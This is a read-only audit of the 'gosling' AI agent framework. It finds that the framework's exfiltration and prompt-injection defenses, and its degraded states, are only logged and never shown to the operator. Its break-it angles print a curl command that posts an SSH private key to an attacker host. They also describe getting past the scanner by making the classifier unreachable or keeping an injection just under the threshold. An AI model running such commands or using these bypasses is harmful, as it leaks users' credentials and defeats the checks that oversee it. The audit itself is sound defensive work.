# Audit — Operator Signal & Detection Lens (`gosling`)

Lens: `audit-operator-signal` (detection & operator signal). Scope: are failures,
stalls, degraded states, retries, skipped work, and partial outcomes **visible,
traceable, and actionable** to the operator? Authority: **audit-only / read-only**.
Builds on `docs/cloud/00-orientation.md`. Finding IDs: `SIG-GSL-NNN` (domain
`Failsafe`, prefix reused per lens convention). Inventory mnemonics are `SIG-0NN`
from the skill (coverage, not finding IDs).

## Executive summary

The agent loop's **provider-error surface is genuinely good**: context-limit,
credit-exhaustion, refusal, and network errors are turned into actionable,
user-visible `Message`s that name the next safe step (agent.rs:2446-2557). Startup
extension failures are surfaced to the CLI operator in yellow with a debug hint
(builder.rs:197-218). Above-threshold prompt-injection findings become an approval
prompt carrying the explanation and a finding id (security_inspector.rs:27-45 →
tool_execution.rs:93-113).

The weakness is **the security/degradation surface**. The framework's own
data-exfiltration and prompt-injection defenses, and its runtime capability
degradations, emit signal **only through `tracing`** — and the CLI initializes
logging with `console: false` (gosling-cli/src/logging.rs:19), so every
`tracing::info!/warn!/error!` goes to a rotating log file under the state dir that
no interactive operator reads. The result is a cluster of **silent / log-only**
security and degradation signals:

- the **egress inspector never blocks or prompts** — it only logs (`Allow` +
  `tracing::info!`), so a detected data-exfil destination is invisible to the user;
- a **tool inspector that errors fails open silently** — the tool runs with the
  security control skipped and only an `error!` line to the file;
- **below-threshold** malicious classifications are log-only;
- an **extension that fails to list tools at runtime** silently loses its tools;
- **ML classifier init failure** silently downgrades to pattern-only detection.

None of these reach the operator in the default interactive path. Time-to-detection
for all of them is *days-to-never* / `user_report`.

## Detection & Signal Map

| Failure event | Detection method | Signal surface | Audience | Operator visibility | Time to detection | Signal content | Next safe action |
|---|---|---|---|---|---|---|---|
| Data-exfil destination in shell/web tool call | `log` | `tracing::info!` → log file | whoever opens the log (≈ nobody) | silent (interactive) | days-to-never | destination/domain/direction in a log record | none surfaced |
| Security/adversary inspector errors (e.g. ML classify fails) | `log` | `tracing::error!` → log file; tool proceeds | log reader (≈ nobody) | silent | days-to-never | inspector name + error; **no** signal that scanning was skipped | none surfaced (fail-open) |
| Prompt-injection finding **below** threshold | `log` | `tracing::warn!` → log file; tool allowed | log reader (≈ nobody) | silent | days-to-never | confidence, explanation, tool json | none surfaced |
| Prompt-injection finding **above** threshold | `exception`→approval | `with_action_required` approval message | end user | UI-visible | immediate | explanation + finding id | approve/deny prompt (good) |
| Extension `list_tools` fails at runtime | `log` | `tracing::warn!`; returns empty tools | log reader (≈ nobody) | silent | days-to-never (user asks "why no tool?") | extension name + error | none surfaced |
| Extension fails to **start** (CLI) | `log`+UI | `eprintln!` yellow warning + hint | end user (CLI) | UI-visible | immediate | extension label + error + debug hint | "ask gosling to debug" (good) |
| ML classifier init fails → pattern-only | `log` | `tracing::warn!` → log file | log reader (≈ nobody) | silent | never | error chain; downgrade not announced | none surfaced |
| Provider ContextLength / Credits / Refusal / Network | `exception`→msg | yielded `Message` (inline/system notification) | end user | UI-visible | immediate | reason + remedy (add credits / resend / new session) | stated (good) |
| Provider other error (catch-all) | `exception`→msg | yielded `Message` with `{provider_err}` | end user | UI-visible | immediate | raw error text + "retry if transient" | stated (good) |

## Observability-gap scoring (ranked; driving axis named)

1. **Egress detection log-only** — required `logged`+actionable (data-exfil is
   destructive/irreversible once egress happens) → actual `silent` (interactive).
   Gap 2, driven by **reversibility** (exfil cannot be undone). → **SIG-GSL-001**.
2. **Inspector fail-open silent** — required `logged`+actionable (a bypassed
   security control on a tool call) → actual `silent`. Gap 2, driven by
   **operator-deception** (control appears active but was skipped). → **SIG-GSL-002**.
3. **Extension runtime tool-loss silent** — required `logged`+actionable
   (capability change) → actual `silent`. Gap 2, driven by **likelihood**
   (transient MCP errors are common). → **SIG-GSL-004**.
4. **Below-threshold finding log-only** — required `logged` → actual `silent`
   interactive. Gap 1-2, driven by likelihood. → **SIG-GSL-003**.
5. **ML→pattern downgrade silent** — required `logged` (degraded capability) →
   actual `silent`. Gap 1-2. → **SIG-GSL-005**.

## Log & Alert Quality Rubric (sampled failure-path statements)

- **Structured fields**: security events are *well* structured — stable
  `security.event_type`, `security.action`, `finding_id`, confidence, threshold,
  tool ids (security/mod.rs:167-186, egress_inspector.rs:356-366). Machine triage
  is good **if** the log is shipped.
- **Severity honesty**: mostly honest. One inversion: **egress detection uses
  `security.action = "LOG"` at `tracing::info!`** for a data-exfil-class event
  (egress_inspector.rs:356-366) — an event class the code itself labels
  `threat_type = "data_exfiltration"` is emitted at `info`, below the default WARN
  console threshold and with no escalation.
- **Alert routing**: there is **no alert routing**. The only sinks are the log
  file, optional OTLP (feature+config gated, otlp.rs), and optional Langfuse
  (logging.rs:103). No config maps any `security.*` event to a human-received
  alert. Delivery of even the log-shipping path is `Likely` at best (unprobed).
- **Actionability test** on the egress/inspector-fail signals: as an interactive
  operator you get **zero of five answers** (you never see them). As a
  log-reader you get Q1-3 but not Q4/Q5. Fails.

## Findings

| ID | Title | Severity | Confidence |
|---|---|---|---|
| SIG-GSL-001 | Egress (data-exfil) inspector is log-only; never surfaces to operator | High | Confirmed |
| SIG-GSL-002 | Tool inspectors fail open silently on error (security control skipped, no signal) | High | Confirmed |
| SIG-GSL-003 | Below-threshold prompt-injection findings are log-only | Medium | Confirmed |
| SIG-GSL-004 | Extension runtime `list_tools` failure silently degrades tool set | Medium | Confirmed |
| SIG-GSL-005 | ML classifier init failure silently downgrades to pattern-only detection | Low | Confirmed |

---

### SIG-GSL-001: Egress (data-exfil) inspector is log-only; never surfaces to operator

Severity: High
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Failsafe (SIG-006/SIG-011)

Evidence:
- `crates/gosling/src/security/egress_inspector.rs:356-366` — on a detected
  destination the inspector emits `tracing::info!(security.event_type = "egress",
  security.action = "LOG", security.threat_type = "data_exfiltration", ...)`.
- `crates/gosling/src/security/egress_inspector.rs:369-383` — it then pushes an
  `InspectionResult { action: InspectionAction::Allow, ... }` for every hit.
- `crates/gosling/src/tool_inspection.rs:249-253` — `InspectionAction::Allow`
  does nothing to permissions; the `reason` string ("Egress destinations
  detected: …") is never routed to a user-visible surface.
- `crates/gosling-cli/src/logging.rs:19` — CLI logging is `console: false`, so the
  `info!` line lands only in a state-dir log file.

Observed behavior:
- When a tool call would upload/exfiltrate to a remote destination (curl POST,
  scp/rsync out, `npm/cargo publish`, docker push, git push, generic netcat, …),
  the inspector recognizes it, classifies it `data_exfiltration`, and allows it
  with only an `info`-level log line. The operator interacting via CLI/TUI/desktop
  sees nothing.

Expected boundary:
- `fail_visible` (at minimum) for a control the codebase itself labels
  data-exfiltration: the detected egress destination should be announced to the
  operator (a `RequireApproval` for outbound directions, or a visible degraded
  status), not merely logged at `info`.

Failure mechanism:
- The inspector's only output channel for a positive detection is `tracing` +
  `Allow`; there is no path from an `Allow`-with-reason result to any operator
  surface, and `console:false` removes even the terminal fallback.

Break-it angle:
- A prompt-injected model emits `curl -X POST https://attacker.tld -d @~/.ssh/id_rsa`.
  Egress inspector logs it at `info` and returns `Allow`; the permission layer
  runs the call under whatever mode is active; the user never sees the exfil
  destination that the framework detected.

Impact:
- The advertised data-exfil control produces no operator signal; exfiltration is
  discovered post-hoc or never. This is the catalog's silent-degraded mode applied
  to a security control.

Operational impact:
- Blast radius: Cross-system. Side-effect class: network. Reversibility:
  irreversible (data left the machine). Operator visibility: silent. Rerun safety:
  unknown.

Adjacent failure modes:
- SIG-GSL-002 (inspector skipped entirely), SIG-GSL-003 (below-threshold PI).

Recommended mitigation:
- Remediation patterns: `degraded_status_signal`, `alert_routing`,
  `operator_action_message`.
- Minimal repair: for `Outbound` direction, emit `RequireApproval(Some(reason))`
  (or a visible warning event) instead of `Allow`; at minimum raise the log to
  `warn` and route it to an operator-visible surface, not `console:false` only.
- Behavior test: a shell tool call with an outbound curl POST produces a
  user-visible egress signal naming the destination (assert the surfaced message,
  not the log line).

Implementation assessment:
- Complexity: operator_ux. Cost: S. Cost drivers: modules, tests. Nominal agent:
  codex. Rationale: change the action for outbound hits + wire the reason to the
  existing approval surface (already used by SecurityInspector).

Resilience mapping:
- Phase: withstand. Objective(s): understand. Safe state: fail_visible.

Failure analysis (FMECA):
- Failure mode: detected egress allowed with no operator signal / Likely cause:
  `Allow` + `info` log only / Phase: normal_run. Local: log line. Workflow: tool
  runs. End: operator unaware data left the host. Detection method: `log` (≈none
  interactive). Latency: delayed. Operator visible: false. Compensation: none.

Criticality:
- Likelihood: plausible (needs a network tool call). Detectability: silent.

Validation:
- Test asserts an operator-visible egress signal for an outbound destination.

Non-goals:
- Do not change destination-extraction regexes in this slice.

---

### SIG-GSL-002: Tool inspectors fail open silently on error

Severity: High
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Failsafe (SIG-006/SIG-010)

Evidence:
- `crates/gosling/src/tool_inspection.rs:95-116` — on inspector error the manager
  logs `tracing::error!(inspector_name, error, "Tool inspector failed")` and
  `// Continue with other inspectors even if one fails`, returning `Ok(all_results)`
  without that inspector's verdict.
- `crates/gosling/src/security/mod.rs:149-153` — the security scanner path calls
  `scanner.analyze_tool_call_with_context(...).await?`; any error (including the ML
  classification client) propagates up, making the whole SecurityInspector return
  `Err`, which is then swallowed at tool_inspection.rs:107.
- `crates/gosling-cli/src/logging.rs:19` — `console: false`: the `error!` is
  file-only.

Observed behavior:
- If a security or adversary inspector errors (ML/classification service
  unreachable, timeout, panic-to-error), the tool call proceeds **without** that
  inspection. The only trace is an `error!` line in a file; the operator is not
  told the security control was skipped, and the tool is not held.

Expected boundary:
- A security control that cannot run should **fail visible** (and, for a security
  control, arguably `fail_closed` → require approval), not fail open silently.
  The operator must learn "prompt-injection scanning did not run for this call."

Failure mechanism:
- The manager's resilience choice ("continue with other inspectors") is correct
  for availability but is applied uniformly to *security* inspectors with no
  operator-facing degraded-mode signal and no escalation of the surviving decision.

Break-it angle:
- Point the classification client at an unreachable endpoint (or induce a
  timeout). Every tool call now bypasses prompt-injection scanning; nothing in the
  UI/CLI indicates the defense is down.

Impact:
- Silent loss of the primary claimed defense (per orientation §5.2) with operator
  deception: the system behaves as if protected.

Operational impact:
- Blast radius: Workflow. Side-effect class: process/network. Reversibility:
  compensatable. Operator visibility: silent. Rerun safety: unknown.

Adjacent failure modes:
- SIG-GSL-001, SIG-GSL-005.

Recommended mitigation:
- Remediation patterns: `degraded_status_signal`, `false_success_guard`,
  `alert_routing`.
- Minimal repair: when a *security-class* inspector returns `Err`, surface a
  degraded-mode notification to the operator (and consider forcing
  `RequireApproval` for the affected tool calls) rather than silently allowing.
- Behavior test: inject an inspector error → assert an operator-visible
  "security inspection unavailable" signal and that the tool is not silently
  allowed.

Implementation assessment:
- Complexity: workflow_protocol. Cost: M. Cost drivers: modules, tests, operator
  UX decision (fail-open vs fail-closed policy). Nominal agent: claude (policy
  choice spans security + UX). Rationale: touches the inspector-manager contract.

Resilience mapping:
- Phase: withstand. Objective(s): understand, constrain. Safe state: fail_visible
  (fail_closed for security-class inspectors is the stronger option).

Failure analysis (FMECA):
- Failure mode: security control skipped, tool allowed / cause: error swallowed +
  continue / phase: normal_run. Local: inspector returns Err. Workflow: tool runs
  unscanned. End: operator believes protection active. Detection: `log` (≈none).
  Latency: delayed. Operator visible: false. Compensation: none.

Criticality:
- Likelihood: plausible (network/timeout on ML path). Detectability: silent.

Validation:
- Test asserts degraded signal + non-silent handling on inspector error.

Non-goals:
- Do not change the availability behavior for non-security inspectors (repetition).

---

### SIG-GSL-003: Below-threshold prompt-injection findings are log-only

Severity: Medium
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Failsafe (SIG-006)

Evidence:
- `crates/gosling/src/security/mod.rs:158-196` — when `is_malicious` is true but
  `confidence <= config_threshold`, the code sets `action = "LOG"`, emits a
  `tracing::warn!` finding, and **does not** push a `SecurityResult` (only the
  `above_threshold` branch at 187-196 pushes one). No result → nothing reaches the
  approval surface.
- `crates/gosling-cli/src/logging.rs:19` — `console: false`.

Observed behavior:
- A tool call the scanner classifies malicious but with sub-threshold confidence is
  allowed with only a `warn` log line the interactive operator never sees.

Expected boundary:
- Sub-threshold-but-flagged calls should at least produce an operator-visible
  advisory (`logged`+actionable), given the class of event.

Failure mechanism:
- The push of an operator-facing result is gated entirely on `above_threshold`;
  the sub-threshold branch has no operator surface.

Break-it angle:
- Craft an injection whose confidence lands just under the configured threshold:
  it executes silently despite being flagged malicious in the logs.

Impact:
- Borderline attacks execute with no operator signal; only forensic log review
  reveals them.

Operational impact:
- Blast radius: Workflow. Side-effect class: process. Reversibility:
  compensatable. Operator visibility: silent. Rerun safety: unknown.

Recommended mitigation:
- Remediation patterns: `degraded_status_signal`, `operator_action_message`.
- Minimal repair: surface sub-threshold flagged calls as a non-blocking visible
  advisory (or a distinct low-severity notification), not log-only.
- Behavior test: sub-threshold malicious classification → assert a visible
  advisory is emitted.

Implementation assessment:
- Complexity: operator_ux. Cost: S. Cost drivers: modules, tests. Nominal agent:
  codex.

Resilience mapping:
- Phase: withstand. Objective(s): understand. Safe state: fail_visible.

Criticality:
- Likelihood: plausible. Detectability: silent (interactive).

Validation:
- Test asserts a visible advisory for a sub-threshold finding.

Non-goals:
- Do not change the threshold or classifier weights here.

Note: prompt-injection scanning is also **disabled by default**
(`SECURITY_PROMPT_ENABLED` … `unwrap_or(false)`, mod.rs:46-55); when disabled the
scan is a silent no-op (mod.rs:82-88, `debug!` only). Whether the default-off
posture is acceptable is a compliance/posture question — cross-referenced to
`audit-compliance-posture` and `audit-security-llm`; here it compounds the signal
gap (no operator indication that the advertised scanner is inactive).

---

### SIG-GSL-004: Extension runtime `list_tools` failure silently degrades tool set

Severity: Medium
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Failsafe (SIG-006/SIG-013)

Evidence:
- `crates/gosling/src/agents/extension_manager.rs:1393-1402` — on `list_tools`
  error: `warn!(extension, error, "Failed to list tools"); return (name, vec![]);`
  — the extension contributes zero tools.
- `crates/gosling/src/agents/extension_manager.rs:1436-1445` — pagination failure:
  `warn!(... "Failed to list tools (pagination)"); break;` — silently truncates the
  tool list.
- `crates/gosling-cli/src/logging.rs:19` — `console: false`.

Observed behavior:
- An extension that started successfully but whose `list_tools` later fails (or
  fails mid-pagination) silently loses some/all of its tools. The model proceeds
  without them; the operator gets no signal, and later sees the agent "unable" to
  use a tool it expected.

Expected boundary:
- Capability degradation of a loaded extension should be operator-visible
  (`fail_visible`), consistent with how **startup** failures already are
  (builder.rs:197-218 — see non-finding NF-3).

Failure mechanism:
- Startup failures are surfaced via `eprintln!`; runtime `list_tools` failures are
  only `warn!`-logged, an inconsistency in the signal path.

Break-it angle:
- A flaky MCP server that connects but intermittently errors on `list_tools` makes
  tools appear and disappear across turns with no operator explanation.

Impact:
- Confusing, silent capability loss; operator cannot distinguish "tool missing"
  from "model chose not to use it."

Operational impact:
- Blast radius: Workflow. Side-effect class: none (capability). Reversibility:
  reversible. Operator visibility: silent. Rerun safety: safe.

Recommended mitigation:
- Remediation patterns: `degraded_status_signal`.
- Minimal repair: emit a user-visible degraded notification when a loaded
  extension fails to enumerate tools (reuse the startup-warning surface).
- Behavior test: force `list_tools` error on a loaded extension → assert an
  operator-visible degraded signal.

Implementation assessment:
- Complexity: operator_ux. Cost: S. Cost drivers: modules, tests. Nominal agent:
  codex.

Resilience mapping:
- Phase: withstand. Objective(s): understand. Safe state: fail_degraded (announced).

Criticality:
- Likelihood: likely (transient MCP/subprocess errors are common). Detectability:
  silent.

Validation:
- Test asserts a visible degraded signal on runtime `list_tools` failure.

Non-goals:
- Do not add retry/backoff here (that is a reliability-lens concern).

---

### SIG-GSL-005: ML classifier init failure silently downgrades to pattern-only

Severity: Low
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Failsafe (SIG-006)

Evidence:
- `crates/gosling/src/security/mod.rs:112-129` — when ML detection is requested but
  `PromptInjectionScanner::with_ml_detection()` errors, the code logs
  `tracing::warn!("ML scanning requested but failed to initialize. Falling back to
  pattern-only scanning. …")` and silently uses `PromptInjectionScanner::new()`.
- `crates/gosling-cli/src/logging.rs:19` — `console: false`.

Observed behavior:
- The operator enabled ML-based detection, but if init fails the system quietly
  runs pattern-only detection. No operator-visible signal that the stronger
  detection is inactive.

Expected boundary:
- A downgrade from requested ML detection to pattern-only is a degraded security
  posture and should be announced (`fail_visible`).

Failure mechanism:
- The fallback is intentional for availability but the degraded state is
  `warn`-logged only.

Impact:
- Operator over-trusts detection strength; weaker coverage than believed.

Operational impact:
- Blast radius: Workflow. Side-effect class: none. Reversibility: reversible.
  Operator visibility: silent. Rerun safety: safe.

Recommended mitigation:
- Remediation patterns: `degraded_status_signal`.
- Minimal repair: surface a one-time operator-visible notice when ML detection was
  requested but is running in pattern-only fallback.
- Behavior test: force ML init failure → assert a visible degraded-mode notice.

Implementation assessment:
- Complexity: operator_ux. Cost: XS. Cost drivers: modules. Nominal agent: codex.

Resilience mapping:
- Phase: withstand. Objective(s): understand. Safe state: fail_visible.

Criticality:
- Likelihood: unlikely. Detectability: silent.

Validation:
- Test asserts a visible degraded notice on ML init failure.

Non-goals:
- Do not change the fallback behavior itself.

## Non-findings (checked and held)

- **NF-1 — Provider error surfacing is honest and actionable.**
  `crates/gosling/src/agents/agent.rs:2446-2557`: ContextLengthExceeded triggers a
  visible "compacting…"/"unable to continue" message; CreditsExhausted yields a
  `CreditsExhausted` system notification with a top-up URL and "add credits then
  resend"; Refusal yields "provider refused … start a new session"; NetworkError
  yields the error + "resend to try again"; the catch-all propagates the raw
  `{provider_err}` with a retry hint. Root cause survives to the operator with a
  next safe action — `reason_propagation` + `operator_action_message` satisfied.

- **NF-2 — Above-threshold prompt-injection surfaces as an approval prompt.**
  `security_inspector.rs:27-45` builds `RequireApproval(Some("🔒 Security Alert …
  Finding ID: …"))`; `tool_execution.rs:93-113` threads that `security_message`
  into `with_action_required`, and the user's decision is recorded
  (`tool_execution.rs:118-132`). The operator sees the explanation and a finding id
  and must approve/deny. Honest, actionable, UI-visible.

- **NF-3 — CLI startup extension failure is operator-visible.**
  `crates/gosling-cli/src/session/builder.rs:197-218`: a failed extension prints a
  yellow "Failed to start extension '…' … continuing without it" plus a dim debug
  hint. `fail_visible` at startup (contrast SIG-GSL-004 for the runtime path).

- **NF-4 — Agent loop emits progress/thinking signal.**
  The loop yields `SystemNotificationType::ThinkingMessage` /`InlineMessage`
  events (e.g. agent.rs:2462-2473 during compaction) and streams assistant output,
  so a long turn is distinguishable from a hang at the UI level. (Not a full
  heartbeat/watchdog — see Validation Limits.)

- **NF-5 — Security event logs are well-structured.**
  `security/mod.rs:167-186` and `egress_inspector.rs:356-366` emit stable event
  names, actions, confidences, thresholds, finding ids, and tool ids. The signal
  *content* is good; the defect is the *routing/visibility* (findings above), not
  the structure.

## Break-it review (reasoned, non-destructive)

- Induced egress: outbound `curl -X POST … -d @secret` → detected, `info`-logged,
  `Allow`ed; no operator signal (SIG-GSL-001). Confirmed from source.
- Induced inspector error (unreachable classification endpoint): tool proceeds
  unscanned, `error!` to file only (SIG-GSL-002). Confirmed from source.
- Sub-threshold injection: executes with only a `warn` log (SIG-GSL-003).
- Flaky extension `list_tools`: tools vanish silently (SIG-GSL-004).
- Provider 402/network/refusal: **all** produce actionable user messages (NF-1).
- No health/readiness endpoint applies here (desktop/CLI/agent, not a service);
  SIG-002 recorded as N/A for the audited surface (the `gosling-server` crate was
  not walked — see Validation Limits).

## Cross-lens escalations

- **`audit-workflow-gui`**: verify the desktop (React/ACP) and TUI actually
  *render* (a) the `security_message` on `with_action_required`, (b) failed tool
  results (`CallToolResult::error`) as failures rather than blank/fake success, and
  (c) whether any egress/degraded signal could be surfaced in the UI. This lens
  confirmed the core produces the message; end-to-end UI rendering was not traced.
- **`audit-security-llm` / `audit-compliance-posture`**: the default-off
  prompt-injection scanner (`SECURITY_PROMPT_ENABLED` default false) and the
  fail-open inspector policy are posture/mechanism questions beyond signal.
- **`audit-failsafe-readiness` / `audit-reliability`**: SIG-GSL-002's fail-open vs
  fail-closed choice and SIG-GSL-004's missing retry are mechanism siblings.
- **`audit-pipeline-externalapi`**: provider retry/backoff behavior (only the
  error-surfacing tail was audited here) belongs to that lens.

## Validation Limits (what was NOT reviewed)

- **Not executed.** No app was built or run; all findings are `source-evidenced`
  from code read in `crates/gosling`. No runtime probe of log/OTLP delivery.
- **Log/alert delivery is `Likely`, not `Confirmed`.** That security events reach
  *any* human via OTLP (`otel/otlp.rs`, feature+config gated) or Langfuse
  (`logging.rs:103`) was not probed; the `console:false` file-only default *was*
  confirmed (gosling-cli/src/logging.rs:19).
- **Desktop/TUI rendering not traced.** Whether `ui/desktop` and `ui/text`
  visually distinguish tool failure from success, and whether they could surface
  degraded/egress signals, was left to `audit-workflow-gui`.
- **`gosling-server` not walked** for health/readiness (SIG-002). If it exposes
  HTTP endpoints, a health-honesty pass is owed there.
- **Sampling.** ~374 `.ok()/unwrap_or_default/let _ =` sites exist across 108 core
  files; only the security, inspection, extension-manager, agent-loop, and logging
  paths were walked. Other swallow sites (session import, oauth, providers) were
  not individually triaged for signal loss.
- **Adversary inspector** (`adversary_inspector.rs`) enablement/surfacing was not
  read in depth (config-gated by `~/.config/gosling/adversary.md` per orientation);
  its error path likely shares the SIG-GSL-002 fail-open manager behavior but was
  not separately confirmed.
